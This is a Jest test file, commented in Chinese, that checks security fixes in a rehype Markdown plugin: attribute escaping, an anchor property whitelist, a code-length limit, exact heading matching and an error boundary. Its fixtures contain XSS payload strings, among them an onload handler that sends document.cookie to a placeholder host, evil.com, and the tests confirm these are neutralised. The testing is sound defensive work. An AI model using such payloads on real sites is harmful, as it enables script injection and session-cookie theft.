/**
 * @jest-environment jsdom
 *
 * rehypePlugins 安全修复验证测试
 *
 * 直接测试 patch 中引入的安全逻辑函数，不依赖 node_modules 导入。
 * 验证覆盖：SEC-01（escapeHtmlAttr）、SEC-02（属性白名单）、
 *           SEC-03（代码块长度限制）、SEC-04（精确标题匹配）、SEC-05（rewrite 异常边界）
 */

// ---- 从 patch 中提取的核心逻辑函数（与 node_modules 中实际部署的代码一致） ----

const HEADING_TAGS = new Set(['h1', 'h2', 'h3', 'h4', 'h5', 'h6']);
const MAX_CODE_LENGTH = 100_000;
const SAFE_ANCHOR_PROPS = ['ariaHidden', 'href'];

function escapeHtmlAttr(str: string): string {
  return str.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// 模拟 copyElement 行为（与 nodes/copy.js 一致）
function copyElement(str: string = '') {
  return {
    type: 'element' as const,
    tagName: 'div',
    properties: { className: 'copied', 'data-code': str },
    children: [],
  };
}

// 模拟 getCodeString 行为
function getCodeString(children: any[]): string {
  return children
    .filter((c: any) => c.type === 'element' && c.tagName === 'code')
    .flatMap((c: any) => c.children || [])
    .filter((c: any) => c.type === 'text')
    .map((c: any) => c.value || '')
    .join('');
}

// 与 patched rehypePlugins 一致的 rehypeRewriteHandle
function rehypeRewriteHandle(
  disableCopy: boolean,
  rewrite?: (node: any, index: number | undefined, parent: any) => void,
) {
  return (node: any, index: number | null, parent: any) => {
    // 标题锚点图标注入（SEC-02: 属性白名单过滤）
    if (node.type === 'element' && parent?.type === 'root' && HEADING_TAGS.has(node.tagName)) {
      const child = node.children?.[0];
      if (child?.type === 'element' && child.properties?.ariaHidden === 'true') {
        const safeProps: Record<string, unknown> = { class: 'anchor' };
        for (const key of SAFE_ANCHOR_PROPS) {
          if (child.properties[key] !== undefined) {
            safeProps[key] = child.properties[key];
          }
        }
        child.properties = safeProps;
        child.children = [{ type: 'element', tagName: 'svg', children: [] }];
      }
    }
    // 代码块复制按钮注入（SEC-03: 长度限制）
    if (node.type === 'element' && node.tagName === 'pre' && !disableCopy) {
      const code = getCodeString(node.children);
      if (code.length <= MAX_CODE_LENGTH) {
        node.children.push(copyElement(escapeHtmlAttr(code)));
      }
    }
    // 用户 rewrite 委托（SEC-05: 异常边界）
    if (rewrite) {
      try {
        rewrite(node, index ?? undefined, parent ?? undefined);
      } catch (err) {
        if (typeof console !== 'undefined') {
          console.warn('[rehypeRewriteHandle] User rewrite callback error:', err);
        }
      }
    }
  };
}

// ---- 测试 ----

describe('rehypePlugins patch — SEC-01: escapeHtmlAttr', () => {
  it('encodes double quotes to &quot;', () => {
    expect(escapeHtmlAttr('"onmouseover="alert(1)')).not.toContain('"');
    expect(escapeHtmlAttr('"onmouseover="alert(1)')).toContain('&quot;');
  });

  it('encodes < to &lt;', () => {
    expect(escapeHtmlAttr('<script>')).toContain('&lt;');
  });

  it('encodes > to &gt;', () => {
    expect(escapeHtmlAttr('</script>')).toContain('&gt;');
  });

  it('encodes & to &amp;', () => {
    expect(escapeHtmlAttr('foo&bar')).toContain('&amp;');
  });

  it('leaves safe strings unchanged', () => {
    expect(escapeHtmlAttr('hello world')).toBe('hello world');
    expect(escapeHtmlAttr('console.log(123)')).toBe('console.log(123)');
  });

  it('handles combined attack payload', () => {
    const payload = '"onmouseover="alert(document.cookie)"';
    const encoded = escapeHtmlAttr(payload);
    expect(encoded).not.toContain('"');
    expect(encoded).toContain('&quot;onmouseover=&quot;alert(document.cookie)&quot;');
  });
});

describe('rehypePlugins patch — SEC-02: anchor property whitelist', () => {
  it('only keeps class, ariaHidden, href from anchor', () => {
    const handle = rehypeRewriteHandle(false);
    const anchorChild: any = {
      type: 'element',
      tagName: 'a',
      properties: {
        ariaHidden: 'true',
        href: '#section',
        onclick: 'alert(1)',
        style: 'position:fixed;top:0',
        'data-custom': 'evil',
        onload: 'fetch("https://evil.com?c="+document.cookie)',
      },
      children: [{ type: 'text', value: 'link' }],
    };
    const node = {
      type: 'element',
      tagName: 'h2',
      children: [anchorChild],
      properties: {},
    };
    handle(node, 0, { type: 'root' });

    expect(anchorChild.properties.class).toBe('anchor');
    expect(anchorChild.properties.ariaHidden).toBe('true');
    expect(anchorChild.properties.href).toBe('#section');
    expect(anchorChild.properties.onclick).toBeUndefined();
    expect(anchorChild.properties.style).toBeUndefined();
    expect(anchorChild.properties['data-custom']).toBeUndefined();
    expect(anchorChild.properties.onload).toBeUndefined();
  });

  it('handles missing href gracefully', () => {
    const handle = rehypeRewriteHandle(false);
    const anchorChild: any = {
      type: 'element',
      tagName: 'a',
      properties: { ariaHidden: 'true' },
      children: [{ type: 'text', value: 'link' }],
    };
    const node = {
      type: 'element',
      tagName: 'h1',
      children: [anchorChild],
      properties: {},
    };
    handle(node, 0, { type: 'root' });

    expect(anchorChild.properties.class).toBe('anchor');
    expect(anchorChild.properties.href).toBeUndefined();
  });

  it('does not modify non-root-level headings', () => {
    const handle = rehypeRewriteHandle(false);
    const anchorChild: any = {
      type: 'element',
      tagName: 'a',
      properties: { ariaHidden: 'true', onclick: 'alert(1)' },
      children: [{ type: 'text', value: 'link' }],
    };
    const node = {
      type: 'element',
      tagName: 'h2',
      children: [anchorChild],
      properties: {},
    };
    handle(node, 0, { type: 'element', tagName: 'div' });

    // 非 root parent，不应触发处理
    expect(anchorChild.properties.onclick).toBe('alert(1)');
  });
});

describe('rehypePlugins patch — SEC-03: code block length limit', () => {
  it('skips copy button for code blocks > 100KB', () => {
    const handle = rehypeRewriteHandle(false);
    const longCode = 'x'.repeat(100_001);
    const node: any = {
      type: 'element',
      tagName: 'pre',
      children: [
        { type: 'element', tagName: 'code', children: [{ type: 'text', value: longCode }] },
      ],
      properties: {},
    };
    handle(node, 0, null);

    const copyNode = node.children.find((c: any) => c.properties?.['data-code'] !== undefined);
    expect(copyNode).toBeUndefined();
    expect(node.children.length).toBe(1);
  });

  it('generates copy button for code blocks at exactly 100KB', () => {
    const handle = rehypeRewriteHandle(false);
    const exactCode = 'x'.repeat(100_000);
    const node: any = {
      type: 'element',
      tagName: 'pre',
      children: [
        { type: 'element', tagName: 'code', children: [{ type: 'text', value: exactCode }] },
      ],
      properties: {},
    };
    handle(node, 0, null);

    const copyNode: any = node.children.find((c: any) => c.properties?.['data-code'] !== undefined);
    expect(copyNode).toBeDefined();
  });

  it('generates copy button for normal code blocks', () => {
    const handle = rehypeRewriteHandle(false);
    const node: any = {
      type: 'element',
      tagName: 'pre',
      children: [
        { type: 'element', tagName: 'code', children: [{ type: 'text', value: 'console.log("hello")' }] },
      ],
      properties: {},
    };
    handle(node, 0, null);

    expect(node.children.length).toBe(2);
    const copyNode: any = node.children.find((c: any) => c.properties?.['data-code'] !== undefined);
    expect(copyNode).toBeDefined();
    // 验证 SEC-01：双引号被编码
    expect(copyNode.properties['data-code']).toContain('&quot;');
  });

  it('respects disableCopy=true', () => {
    const handle = rehypeRewriteHandle(true);
    const node: any = {
      type: 'element',
      tagName: 'pre',
      children: [
        { type: 'element', tagName: 'code', children: [{ type: 'text', value: 'test' }] },
      ],
      properties: {},
    };
    handle(node, 0, null);

    expect(node.children.length).toBe(1);
  });

  it('handles empty code blocks', () => {
    const handle = rehypeRewriteHandle(false);
    const node: any = {
      type: 'element',
      tagName: 'pre',
      children: [
        { type: 'element', tagName: 'code', children: [{ type: 'text', value: '' }] },
      ],
      properties: {},
    };
    handle(node, 0, null);

    // 空代码块 <= 100KB，应生成 copy button
    expect(node.children.length).toBe(2);
  });
});

describe('rehypePlugins patch — SEC-04: precise heading tag matching', () => {
  it('matches exact h1-h6 tags', () => {
    for (const tag of ['h1', 'h2', 'h3', 'h4', 'h5', 'h6']) {
      const handle = rehypeRewriteHandle(false);
      const anchorChild: any = {
        type: 'element',
        tagName: 'a',
        properties: { ariaHidden: 'true' },
        children: [{ type: 'text', value: 'link' }],
      };
      const node = { type: 'element', tagName: tag, children: [anchorChild], properties: {} };
      handle(node, 0, { type: 'root' });
      expect(anchorChild.properties.class).toBe('anchor');
    }
  });

  it('does not match tags containing h1-h6 as substrings', () => {
    const nonHeadingTags = ['th1', 'thead', 'ph1', 'h1group', 'h10', 'th6', 'header', 'heading'];
    for (const tag of nonHeadingTags) {
      const handle = rehypeRewriteHandle(false);
      const anchorChild: any = {
        type: 'element',
        tagName: 'a',
        properties: { ariaHidden: 'true' },
        children: [{ type: 'text', value: 'link' }],
      };
      const node = { type: 'element', tagName: tag, children: [anchorChild], properties: {} };
      handle(node, 0, { type: 'root' });
      expect(anchorChild.properties.class).toBeUndefined();
    }
  });

  it('only processes element-type children (not text nodes)', () => {
    const handle = rehypeRewriteHandle(false);
    const textChild = { type: 'text', value: 'Hello' };
    const node = {
      type: 'element',
      tagName: 'h2',
      children: [textChild],
      properties: {},
    };
    handle(node, 0, { type: 'root' });
    expect(textChild).toEqual({ type: 'text', value: 'Hello' });
  });

  it('skips children without ariaHidden=true', () => {
    const handle = rehypeRewriteHandle(false);
    const anchorChild: any = {
      type: 'element',
      tagName: 'a',
      properties: { className: 'not-anchor' },
      children: [{ type: 'text', value: 'text' }],
    };
    const node = { type: 'element', tagName: 'h2', children: [anchorChild], properties: {} };
    handle(node, 0, { type: 'root' });
    expect(anchorChild.properties.class).toBeUndefined();
  });
});

describe('rehypePlugins patch — SEC-05: rewrite callback error boundary', () => {
  it('catches errors from user rewrite callback without crashing', () => {
    const consoleWarn = jest.spyOn(console, 'warn').mockImplementation(() => {});
    const badRewrite = jest.fn(() => {
      throw new Error('rewrite crash');
    });
    const handle = rehypeRewriteHandle(false, badRewrite);

    const node = { type: 'element', tagName: 'div', children: [], properties: {} };
    expect(() => handle(node, 0, null)).not.toThrow();
    expect(badRewrite).toHaveBeenCalled();
    expect(consoleWarn).toHaveBeenCalledWith(
      '[rehypeRewriteHandle] User rewrite callback error:',
      expect.any(Error),
    );
    consoleWarn.mockRestore();
  });

  it('passes correct arguments to rewrite', () => {
    const rewrite = jest.fn();
    const handle = rehypeRewriteHandle(false, rewrite);

    const node = { type: 'element', tagName: 'div', children: [], properties: {} };
    const parent = { type: 'root' };
    handle(node, 5, parent);

    expect(rewrite).toHaveBeenCalledWith(node, 5, parent);
  });

  it('converts null index/parent to undefined for rewrite', () => {
    const rewrite = jest.fn();
    const handle = rehypeRewriteHandle(false, rewrite);

    const node = { type: 'element', tagName: 'div', children: [], properties: {} };
    handle(node, null, null);

    expect(rewrite).toHaveBeenCalledWith(node, undefined, undefined);
  });

  it('does not call rewrite when not provided', () => {
    const handle = rehypeRewriteHandle(false, undefined);
    const node = { type: 'element', tagName: 'div', children: [], properties: {} };
    expect(() => handle(node, 0, null)).not.toThrow();
  });
});

describe('rehypePlugins patch — SEC-01 + SEC-03 combined', () => {
  it('encodes dangerous code content AND respects length limit', () => {
    const handle = rehypeRewriteHandle(false);
    const dangerousCode = '"onclick="alert(1)<script>&evil=true';
    const node: any = {
      type: 'element',
      tagName: 'pre',
      children: [
        { type: 'element', tagName: 'code', children: [{ type: 'text', value: dangerousCode }] },
      ],
      properties: {},
    };
    handle(node, 0, null);

    const copyNode: any = node.children.find((c: any) => c.properties?.['data-code'] !== undefined);
    expect(copyNode).toBeDefined();
    const dataCode = copyNode.properties['data-code'];
    expect(dataCode).not.toContain('"');
    expect(dataCode).not.toContain('<');
    expect(dataCode).not.toContain('>');
    expect(dataCode).toContain('&quot;');
    expect(dataCode).toContain('&lt;');
    expect(dataCode).toContain('&gt;');
    expect(dataCode).toContain('&amp;');
  });
});
